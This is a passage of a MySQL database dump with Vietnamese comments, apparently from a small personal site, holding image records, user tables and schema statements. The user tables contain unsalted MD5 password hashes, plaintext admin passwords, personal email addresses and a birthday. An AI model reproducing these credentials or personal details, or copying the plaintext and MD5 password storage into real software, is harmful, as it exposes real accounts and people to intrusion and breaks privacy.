(713, 7, 'e2b48041eae2200c_66a5c3442afb92.85246656.png', '2024-07-27 21:04:20'),
(714, 7, 'ccd1ed60e19289f7_66a5c34d46f120.13469476.png', '2024-07-27 21:04:29'),
(715, 7, '8ad1fe489ef1234e_66a5c356d98f79.64554316.png', '2024-07-27 21:04:38'),
(716, 7, 'a839d65a771b9b8f_66a5c35fc81b61.21214386.png', '2024-07-27 21:04:47'),
(717, 7, 'ee4f1b974dcc19be_66a5c375a38c00.86323158.png', '2024-07-27 21:05:09'),
(718, 7, 'c6ee11d08fb2476a_66a5c37d0439c8.21568834.png', '2024-07-27 21:05:17'),
(719, 7, '65f6dc88c8138bad_66a5c385936978.43897180.png', '2024-07-27 21:05:25'),
(720, 7, '13d2bcc5a2b62977_66a5c38f11e7d3.41581249.png', '2024-07-27 21:05:35'),
(721, 7, '293a9fb56e6bbff5_66a5c397829298.03263500.png', '2024-07-27 21:05:43'),
(722, 7, '0266999eed014a51_66a5c3a065e353.08199166.png', '2024-07-27 21:05:52'),
(723, 7, '9d2be13788b68451_66a5c3aa48baa3.71776256.png', '2024-07-27 21:06:02'),
(724, 7, 'f73cb1c49765caec_66a5c3b513a833.78977943.png', '2024-07-27 21:06:13'),
(725, 7, '72bd2bc2ab95d0b1_66a5c538e991c7.38682664.png', '2024-07-27 21:12:40'),
(726, 7, '5a17a0d0ccbb443b_66a5c542abf029.36205889.png', '2024-07-27 21:12:50'),
(727, 7, '145cace9aef0fe25_66a5c54b536f89.29604980.png', '2024-07-27 21:12:59'),
(728, 7, 'fb57e2dce0976447_66a5c55305a972.24468465.png', '2024-07-27 21:13:07'),
(729, 7, '00371e40c1dfea5e_66a5c55a244777.25837080.png', '2024-07-27 21:13:14'),
(730, 7, '31f2d93e5658d1aa_66a5c56472cad2.49751841.png', '2024-07-27 21:13:24'),
(731, 7, '6ea361d99dcb55f3_66a5c56c2ae0e8.52667745.png', '2024-07-27 21:13:32'),
(732, 7, '8b8b71eb8cbcce79_66a5c5742cb309.77854864.png', '2024-07-27 21:13:40'),
(733, 7, '8a3e4cf44e53493f_66a5c582c63946.27745115.png', '2024-07-27 21:13:54'),
(734, 7, 'b25934658732a03f_66a5c58a681781.73975389.png', '2024-07-27 21:14:02'),
(735, 7, '7d14d092eacd8646_66a5c59209f5b4.89219026.png', '2024-07-27 21:14:10'),
(736, 7, '13145da335f23b99_66a5c59bb28d65.77963273.png', '2024-07-27 21:14:19'),
(737, 7, '522497cdbc807046_66a5c5a3615c46.00898920.png', '2024-07-27 21:14:27'),
(738, 7, 'b4964e5d5e215fcc_66a5c5aad9d390.70040745.png', '2024-07-27 21:14:34'),
(739, 7, '7b708796c2ada497_66a5c5b1df4ba6.58269889.png', '2024-07-27 21:14:41'),
(740, 7, 'f29169b385309a57_66a5c5ba6e60b0.77092333.png', '2024-07-27 21:14:50');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tbl_image_folder`
--

CREATE TABLE `tbl_image_folder` (
  `tbl_image_folder_id` int NOT NULL,
  `folder_name` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Đang đổ dữ liệu cho bảng `tbl_image_folder`
--

INSERT INTO `tbl_image_folder` (`tbl_image_folder_id`, `folder_name`) VALUES
(4, 'dragon boy x43'),
(6, 'dragon boy x3'),
(7, 'dragon boy x1');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `user`
--

CREATE TABLE `user` (
  `userid` int NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(150) NOT NULL,
  `uname` varchar(60) NOT NULL,
  `photo` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `access` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `user`
--

INSERT INTO `user` (`userid`, `username`, `password`, `uname`, `photo`, `access`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 'Admin', '', 1),
(2, 'lee', '7e0d7f8a5d96c24ffcc840f31bce72b2', 'lee', '', 2),
(3, 'julyn', 'bf70c261981e1708530982d56d2e8e01', 'julyn', '', 2),
(4, 'bubblesort', 'a5f6825519657f37df92d62cc938f9db', 'bubblesort', NULL, 2);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `userss`
--

CREATE TABLE `userss` (
  `id` int UNSIGNED NOT NULL,
  `username` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `birthday` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `AnonyMail` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `reg_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=COMPRESSED;

--
-- Đang đổ dữ liệu cho bảng `userss`
--

INSERT INTO `userss` (`id`, `username`, `email`, `password`, `birthday`, `AnonyMail`, `reg_date`) VALUES
(1, 'admin1', 'adminRaidforums@gmail.com', 'admin1', '', '', '2023-10-31 04:36:12'),
(2, 'admin', 'thanhnguyen126agz@gmail.com', 'admin', '02/12/2006', 'tor@anonymail.com', '2024-08-18 16:56:37');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `post_id` (`post_id`);

--
-- Chỉ mục cho bảng `contentmembers`
--
ALTER TABLE `contentmembers`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `files`
--
ALTER TABLE `files`
  ADD PRIMARY KEY (`id`),
  ADD KEY `project_id` (`project_id`);

--
-- Chỉ mục cho bảng `image_design_games`
--
ALTER TABLE `image_design_games`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `music`
--
ALTER TABLE `music`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `music_vietnamese`
--
ALTER TABLE `music_vietnamese`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `projects`
--
ALTER TABLE `projects`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `speak_nice`
--
ALTER TABLE `speak_nice`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `tbl_image`
--
ALTER TABLE `tbl_image`
  ADD PRIMARY KEY (`tbl_image_id`);

--
-- Chỉ mục cho bảng `tbl_image_folder`
--
ALTER TABLE `tbl_image_folder`
  ADD PRIMARY KEY (`tbl_image_folder_id`);

--
-- Chỉ mục cho bảng `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`userid`);

--
-- Chỉ mục cho bảng `userss`
--
ALTER TABLE `userss`
  ADD PRIMARY KEY (`id`),
  ADD KEY `username` (`username`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `comments`
--
ALTER TABLE `comments`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT cho bảng `contentmembers`
--
ALTER TABLE `contentmembers`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=132;

--
-- AUTO_INCREMENT cho bảng `files`
--
ALTER TABLE `files`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT cho bảng `image_design_games`
--
ALTER TABLE `image_design_games`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT cho bảng `music`
--
ALTER TABLE `music`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=134;

--
-- AUTO_INCREMENT cho bảng `music_vietnamese`
--
ALTER TABLE `music_vietnamese`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT cho bảng `projects`
--
ALTER TABLE `projects`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT cho bảng `speak_nice`
--
ALTER TABLE `speak_nice`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=72;

--
-- AUTO_INCREMENT cho bảng `tbl_image`
--
ALTER TABLE `tbl_image`
  MODIFY `tbl_image_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=741;

--
-- AUTO_INCREMENT cho bảng `tbl_image_folder`
--
ALTER TABLE `tbl_image_folder`
  MODIFY `tbl_image_folder_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT cho bảng `user`
--
ALTER TABLE `user`
  MODIFY `userid` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT cho bảng `userss`
--
ALTER TABLE `userss`
  MODIFY `id` int UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- Các ràng buộc cho các bảng đã đổ
--

--
-- Các ràng buộc cho bảng `comments`
--
ALTER TABLE `comments`
  ADD CONSTRAINT `comments_ibfk_1` FOREIGN KEY (`post_id`) REFERENCES `contentmembers` (`id`) ON DELETE CASCADE;

--
-- Các ràng buộc cho bảng `files`
--
ALTER TABLE `files`
  ADD CONSTRAINT `files_ibfk_1` FOREIGN KEY (`project_id`) REFERENCES `projects` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
